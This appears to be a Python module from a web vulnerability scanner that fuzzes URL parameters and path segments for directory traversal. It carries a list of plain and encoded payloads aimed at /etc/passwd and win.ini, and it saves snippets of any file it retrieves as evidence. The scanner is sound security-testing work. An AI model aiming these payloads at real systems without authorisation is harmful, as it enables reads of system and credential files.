# Directory traversal module.
#
# Tests URL parameters and path segments for traversal vulnerabilities.
# We look for classic ../ sequences, encoded variants, and null byte tricks.
# All checks flag findings without reading or exfiltrating actual file content.

import re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

from colorama import Fore, Style

from utils.http import get
from utils.severity import finding, badge, HIGH, MEDIUM


# Common parameters that developers use for file paths or page names.
# These are the first places to look for traversal.
PATH_PARAMS = [
    "file", "path", "page", "template", "include", "doc", "document",
    "folder", "root", "dir", "load", "read", "display", "show",
    "content", "layout", "conf", "config", "name", "view",
]

# Traversal payloads ordered from basic to encoded.
# We stop as soon as one succeeds — no need to pile on.
TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "....//....//....//etc/passwd",
    "..%252F..%252F..%252Fetc%252Fpasswd",
    "../../../etc/passwd%00",
    "../../../etc/passwd%00.jpg",
    # Windows targets
    "..\\..\\..\\windows\\win.ini",
    "..%5C..%5C..%5Cwindows%5Cwin.ini",
]

# Strings that appear in /etc/passwd on any Linux/Unix system.
UNIX_INDICATORS = [
    "root:x:0:0",
    "root:*:0:0",
    "/bin/bash",
    "/bin/sh",
    "/usr/sbin/nologin",
]

# Strings from Windows win.ini
WINDOWS_INDICATORS = [
    "[fonts]",
    "[extensions]",
    "for 16-bit app support",
]


def _response_contains_traversal_hit(text):
    """Check whether a response body looks like a traversed system file."""
    for indicator in UNIX_INDICATORS + WINDOWS_INDICATORS:
        if indicator in text:
            return True
    return False


def _extract_params(url):
    """Pull query parameters out of a URL for fuzzing."""
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    return parsed, params


def _build_fuzzed_url(parsed, params, param_name, payload):
    """Rebuild the URL with a single parameter replaced by the payload."""
    fuzzed = dict(params)
    fuzzed[param_name] = [payload]

    new_query = urlencode(fuzzed, doseq=True)
    return urlunparse(parsed._replace(query=new_query))


def test_url_params(target_url):
    """
    Fuzz query parameters that look like file paths.

    We check parameters by name first (file=, path=, etc), then fall back
    to fuzzing any parameter that contains a slash or dot in its value,
    which suggests it might already be handling file paths.
    """
    findings  = []
    parsed, params = _extract_params(target_url)

    if not params:
        return findings

    # Priority: known path param names first
    params_to_test = []
    for name in params:
        if name.lower() in PATH_PARAMS:
            params_to_test.insert(0, name)
        elif re.search(r"[./\\]", params[name][0] if params[name] else ""):
            params_to_test.append(name)

    for param_name in params_to_test:
        for payload in TRAVERSAL_PAYLOADS:
            fuzzed_url = _build_fuzzed_url(parsed, params, param_name, payload)
            resp = get(fuzzed_url)

            if resp is None:
                continue

            if _response_contains_traversal_hit(resp.text):
                findings.append(finding(
                    title       = f"Directory Traversal via '{param_name}' Parameter",
                    severity    = HIGH,
                    description = (
                        f"The parameter '{param_name}' is vulnerable to directory traversal. "
                        f"Sending '{payload}' caused the server to return system file content."
                    ),
                    impact      = (
                        "An attacker can read arbitrary files from the server, including "
                        "configuration files, credentials, and source code."
                    ),
                    remediation = (
                        "Validate and sanitise all file path inputs. Use a whitelist of "
                        "allowed filenames rather than accepting user-supplied paths. "
                        "Resolve the canonical path and confirm it falls within the expected directory."
                    ),
                    evidence    = f"Payload: {payload} | Response snippet: {resp.text[:200]}",
                ))

                # One confirmed traversal per parameter is enough evidence.
                break

    return findings


def test_path_segments(base_url):
    """
    Test traversal via path segments in the URL itself.

    Some applications embed file paths directly in URL segments rather than
    query parameters: /files/report.pdf, /download/invoice_123.pdf
    """
    findings = []

    path_style_targets = [
        f"{base_url.rstrip('/')}/files/../../../etc/passwd",
        f"{base_url.rstrip('/')}/static/..%2F..%2F..%2Fetc%2Fpasswd",
        f"{base_url.rstrip('/')}/download/..%2F..%2Fetc%2Fpasswd",
        f"{base_url.rstrip('/')}/include/..%2F..%2F..%2Fetc%2Fpasswd",
    ]

    for url in path_style_targets:
        resp = get(url)
        if resp and _response_contains_traversal_hit(resp.text):
            findings.append(finding(
                title       = "Directory Traversal via URL Path Segment",
                severity    = HIGH,
                description = "A traversal payload embedded in the URL path returned system file content.",
                impact      = "Arbitrary file read from the server filesystem.",
                remediation = (
                    "Normalise and validate URL paths server-side before using them to "
                    "construct file system paths. Reject any path containing '..' sequences."
                ),
                evidence    = f"URL: {url} | Snippet: {resp.text[:200]}",
            ))
            break

    return findings


def run(target_url):
    print(f"{Fore.CYAN}[*] Testing for directory traversal...{Style.RESET_ALL}")
    findings = []

    base_url  = f"{urlparse(target_url).scheme}://{urlparse(target_url).netloc}"
    param_hits = test_url_params(target_url)
    path_hits  = test_path_segments(base_url)

    for f in param_hits + path_hits:
        findings.append(f)
        print(f"  {badge(f['severity'])} {f['title']}")

    if not findings:
        print(f"{Fore.GREEN}[+] No traversal vulnerabilities found{Style.RESET_ALL}")

    return findings
